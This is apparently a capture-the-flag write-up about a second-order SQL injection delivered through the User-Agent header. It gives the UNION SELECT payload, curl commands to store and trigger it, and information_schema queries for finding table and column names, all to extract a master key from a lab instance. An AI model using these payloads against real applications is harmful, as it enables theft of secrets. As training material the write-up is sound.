The dashboard's per-UA query selects a single column, so a one-column
`UNION SELECT` lines up perfectly. Set your `User-Agent` header to:

```
' UNION SELECT master_key FROM settings-- -
```

Then reload `/admin/insights`. For your stored row the server runs, in effect:

```sql
SELECT COUNT(*) FROM ua_events WHERE ua='' UNION SELECT master_key FROM settings-- -'
```

The `'` closes the empty literal, `UNION SELECT master_key FROM settings` appends
the secret as a second row, and `-- -` (dashes **plus a space**) comments out the
trailing quote. The `master_key` (32 hex characters) now shows up in the "Hits"
column of the table.

Two-step delivery with `curl`:

```
# 1) store the payload in your User-Agent (any endpoint works)
curl -s -A "' UNION SELECT master_key FROM settings-- -" http://TARGET/

# 2) trigger the read; grab the 32-hex value from the table
curl -s http://TARGET/admin/insights | grep -Eo '[0-9a-f]{32}'
```

Then trade the key for the flag (GET or POST both work):

```
curl -s "http://TARGET/solve?key=<the 32-hex master_key>"
```

A correct key returns the flag; a wrong one returns 403. The key is random per
instance, so use the one _your_ container disclosed. (Didn't want to assume the
table/column names? Store
`' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()-- -`
to list tables, then swap in `column_name FROM information_schema.columns
WHERE table_name='settings'` — same header-borne technique, no guessing.)
